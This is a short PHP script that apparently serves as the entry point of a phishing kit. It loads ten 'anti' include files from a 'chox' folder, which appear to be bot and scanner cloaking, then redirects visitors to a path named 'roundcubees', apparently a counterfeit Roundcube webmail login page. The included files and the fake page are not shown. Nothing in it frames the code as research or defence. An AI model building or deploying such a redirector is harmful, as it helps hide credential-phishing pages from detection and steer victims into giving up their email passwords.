<?php

	session_start();


			include "./chox/anti0.php";
			include "./chox/anti1.php";
			include "./chox/anti2.php";
			include "./chox/anti3.php";
			include "./chox/anti4.php";
			include "./chox/anti5.php";
			include "./chox/anti6.php";
			include "./chox/anti7.php";
			include "./chox/anti8.php";
			include "./chox/anti9.php";
			include "./chox/index.php";
			
	$src="roundcubees";
	header("location:".$src."");
	exit;
?>